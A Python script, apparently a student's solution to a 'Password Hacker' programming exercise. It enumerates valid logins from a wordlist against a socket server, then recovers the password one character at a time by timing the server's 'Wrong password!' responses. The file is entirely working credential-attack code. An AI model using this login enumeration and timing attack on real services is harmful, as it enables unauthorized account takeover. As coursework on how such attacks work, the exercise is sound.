import sys
import socket
import itertools
import string
import json
from time import perf_counter
pswfile = "C:/Users/daile/PycharmProjects/Password Hacker/Password Hacker/task/hacking/passwords.txt"
loginfile = "C:/Users/daile/PycharmProjects/Password Hacker/Password Hacker/task/hacking/logins.txt"


# Read arguments from command line and return values
def readArgs():

    args = str(sys.argv).split(" ")
    ip = args[1].strip(r"',][")
    port = int(args[2].strip(r"',]["))
    #msg = args[3].strip(r"',][")
    return ip, port


# Brute force search for password
def findPassword():

    charnum = string.ascii_lowercase + string.digits
    for length in range(1, len(charnum)):
        for attempt in itertools.product(charnum, repeat=length):
            yield ''.join(attempt)


# Find variants of password from list
def findPswFromList(pswList):
    for password in pswList:
        yield list(map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in password))))


# Read list of password from file:
def readFile(filename):

    with open(filename) as f:
        lines = f.read().splitlines()
    return lines


# Find psw4
def findPsw4():
    charnum = string.ascii_letters + string.digits
    pswlist = list(itertools.product(charnum, repeat=1))
    for i in pswlist:
        yield ["".join(tup) for tup in i][0]


# Find login
def findLogin(loginfile, client):

    loginList = readFile(loginfile)
    psw = ""
    for login in loginList:
        logpsw = {"login": login,  "password": ""}
        data = json.dumps(logpsw)
        client.send(data.encode())
        res = json.loads(client.recv(1024))
        if res["result"] == "Wrong password!":
            return login


# Try password:
def tryPsw(login, client):
    letters = "abcdefghijklmnopqrstuvwxyz1234567890"

    def tryCandidate(string):
        for s in [string, string.replace(string[-1], string[-1].upper())]:
            data = json.dumps({"login": login, "password": s})
            start = perf_counter()
            client.send(data.encode())
            res = json.loads(client.recv(1024))
            final = perf_counter()
            if res["result"] == "Connection success!":
                return s
            elif (res["result"] == "Wrong password!") & ((final - start) >= 0.1):
                return s[-1]
        return ''

    password = []
    while True:
        for letter in letters:
            temp = ''.join(password)
            temp += letter
            res = tryCandidate(temp)
            if len(res) == 1:
                password.append(res)
            elif len(res) > 1:
                return res
            else:
                continue


if __name__ == "__main__":

    #Read password list:
    pswList = readFile(pswfile)
    # Read ip, port
    ip, port = readArgs()
    address = (ip, port)
    # Establish connection
    with socket.socket() as client:
        client.connect(address)
        login = findLogin(loginfile, client)
        password = tryPsw(login, client)
        logpsw = {"login": login, "password": password}
        data = json.dumps(logpsw)
        print(data)